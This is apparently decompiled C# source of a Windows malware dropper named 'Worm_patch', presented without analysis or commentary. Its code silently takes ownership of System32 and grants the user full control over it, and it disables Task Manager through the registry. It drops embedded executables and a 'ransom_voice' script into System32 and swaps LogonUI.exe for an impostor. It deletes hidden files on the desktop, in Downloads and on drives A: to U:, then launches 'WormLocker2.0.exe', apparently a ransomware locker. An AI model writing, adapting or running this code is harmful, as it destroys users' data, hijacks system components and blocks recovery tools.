using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.Win32;

namespace SysWOW64
{
	// Token: 0x02000002 RID: 2
	public partial class Worm_patch : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public Worm_patch()
		{
			this.InitializeComponent();
			base.TransparencyKey = this.BackColor;
			base.TopMost = true;
			base.Opacity = 1.0;
			Process.Start(new ProcessStartInfo
			{
				FileName = "cmd.exe",
				WindowStyle = ProcessWindowStyle.Hidden,
				Arguments = "/k takeown /f C:\\Windows\\System32 && icacls C:\\Windows\\System32 /grant \"%username%:F\""
			});
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020E8 File Offset: 0x000002E8
		private void Worm_patch_Load(object sender, EventArgs e)
		{
			this.cmd_get.Start();
			this.tmr_start_worm.Start();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002104 File Offset: 0x00000304
		public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
		{
			Assembly callingAssembly = Assembly.GetCallingAssembly();
			using (Stream manifestResourceStream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName))
			{
				using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
				{
					using (FileStream fileStream = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
					{
						using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
						{
							binaryWriter.Write(binaryReader.ReadBytes((int)manifestResourceStream.Length));
						}
					}
				}
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000021EC File Offset: 0x000003EC
		private void cmd_get_Tick(object sender, EventArgs e)
		{
			this.cmd_get.Stop();
			string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
			string text = Path.Combine(environmentVariable, "Downloads");
			string text2 = text;
			Worm_patch.Extract("SysWOW64", "C:\\Windows\\System32", "Script", "LogonUIinf.exe");
			Worm_patch.Extract("SysWOW64", "C:\\Windows\\System32", "Script", "ransom_voice.vbs");
			Worm_patch.Extract("SysWOW64", "C:\\Windows\\System32", "Script", "WormLocker2.0.exe");
			File.Copy("C:\\Windows\\System32\\LogonUI.exe", "C:\\Windows\\System32\\LogonUItrue.exe");
			File.Delete("C:\\Windows\\System32\\LogonUI.exe");
			File.Copy("C:\\Windows\\System32\\LogonUIinf.exe", "C:\\Windows\\System32\\LogonUI.exe");
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray<string>();
			foreach (string path in array)
			{
				File.Delete(path);
			}
			string str = text2;
			string[] array3 = (from f in Directory.EnumerateFiles(str + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray<string>();
			foreach (string path2 in array3)
			{
				File.Delete(path2);
			}
			string text3 = "A:\\";
			string text4 = "B:\\";
			string text5 = "D:\\";
			string text6 = "E:\\";
			string text7 = "F:\\";
			string text8 = "G:\\";
			string text9 = "H:\\";
			string text10 = "I:\\";
			string text11 = "J:\\";
			string text12 = "K:\\";
			string text13 = "L:\\";
			string text14 = "M:\\";
			string text15 = "O:\\";
			string text16 = "P:\\";
			string text17 = "Q:\\";
			string text18 = "R:\\";
			string text19 = "S:\\";
			string text20 = "T:\\";
			string text21 = "U:\\";
			bool flag = Directory.Exists(text3);
			if (flag)
			{
				string[] array5 = (from f in Directory.EnumerateFiles(text3 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path3 in array5)
				{
					File.Delete(path3);
				}
			}
			bool flag2 = Directory.Exists(text4);
			if (flag2)
			{
				string[] array7 = (from f in Directory.EnumerateFiles(text4 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path4 in array7)
				{
					File.Delete(path4);
				}
			}
			bool flag3 = Directory.Exists(text5);
			if (flag3)
			{
				string[] array9 = (from f in Directory.EnumerateFiles(text5 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path5 in array9)
				{
					File.Delete(path5);
				}
			}
			bool flag4 = Directory.Exists(text6);
			if (flag4)
			{
				string[] array11 = (from f in Directory.EnumerateFiles(text6 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path6 in array11)
				{
					File.Delete(path6);
				}
			}
			bool flag5 = Directory.Exists(text7);
			if (flag5)
			{
				string[] array13 = (from f in Directory.EnumerateFiles(text7 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path7 in array13)
				{
					File.Delete(path7);
				}
			}
			bool flag6 = Directory.Exists(text8);
			if (flag6)
			{
				string[] array15 = (from f in Directory.EnumerateFiles(text8 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path8 in array15)
				{
					File.Delete(path8);
				}
			}
			bool flag7 = Directory.Exists(text9);
			if (flag7)
			{
				string[] array17 = (from f in Directory.EnumerateFiles(text9 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path9 in array17)
				{
					File.Delete(path9);
				}
			}
			bool flag8 = Directory.Exists(text10);
			if (flag8)
			{
				string[] array19 = (from f in Directory.EnumerateFiles(text10 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path10 in array19)
				{
					File.Delete(path10);
				}
			}
			bool flag9 = Directory.Exists(text11);
			if (flag9)
			{
				string[] array21 = (from f in Directory.EnumerateFiles(text11 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path11 in array21)
				{
					File.Delete(path11);
				}
			}
			bool flag10 = Directory.Exists(text12);
			if (flag10)
			{
				string[] array23 = (from f in Directory.EnumerateFiles(text12 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path12 in array23)
				{
					File.Delete(path12);
				}
			}
			bool flag11 = Directory.Exists(text13);
			if (flag11)
			{
				string[] array25 = (from f in Directory.EnumerateFiles(text13 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path13 in array25)
				{
					File.Delete(path13);
				}
			}
			bool flag12 = Directory.Exists(text14);
			if (flag12)
			{
				string[] array27 = (from f in Directory.EnumerateFiles(text14 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path14 in array27)
				{
					File.Delete(path14);
				}
			}
			bool flag13 = Directory.Exists(text15);
			if (flag13)
			{
				string[] array29 = (from f in Directory.EnumerateFiles(text15 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path15 in array29)
				{
					File.Delete(path15);
				}
			}
			bool flag14 = Directory.Exists(text16);
			if (flag14)
			{
				string[] array31 = (from f in Directory.EnumerateFiles(text16 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path16 in array31)
				{
					File.Delete(path16);
				}
			}
			bool flag15 = Directory.Exists(text17);
			if (flag15)
			{
				string[] array33 = (from f in Directory.EnumerateFiles(text17 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path17 in array33)
				{
					File.Delete(path17);
				}
			}
			bool flag16 = Directory.Exists(text18);
			if (flag16)
			{
				string[] array35 = (from f in Directory.EnumerateFiles(text18 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path18 in array35)
				{
					File.Delete(path18);
				}
			}
			bool flag17 = Directory.Exists(text19);
			if (flag17)
			{
				string[] array37 = (from f in Directory.EnumerateFiles(text19 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path19 in array37)
				{
					File.Delete(path19);
				}
			}
			bool flag18 = Directory.Exists(text20);
			if (flag18)
			{
				string[] array39 = (from f in Directory.EnumerateFiles(text20 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path20 in array39)
				{
					File.Delete(path20);
				}
			}
			bool flag19 = Directory.Exists(text21);
			if (flag19)
			{
				string[] array41 = (from f in Directory.EnumerateFiles(text21 + "\\")
				where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
				select f).ToArray<string>();
				foreach (string path21 in array41)
				{
					File.Delete(path21);
				}
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002C62 File Offset: 0x00000E62
		private void tmr_start_worm_Tick(object sender, EventArgs e)
		{
			this.tmr_start_worm.Stop();
			Process.Start("C:\\Windows\\System32\\WormLocker2.0.exe");
			base.Close();
			Application.Exit();
		}
	}
}
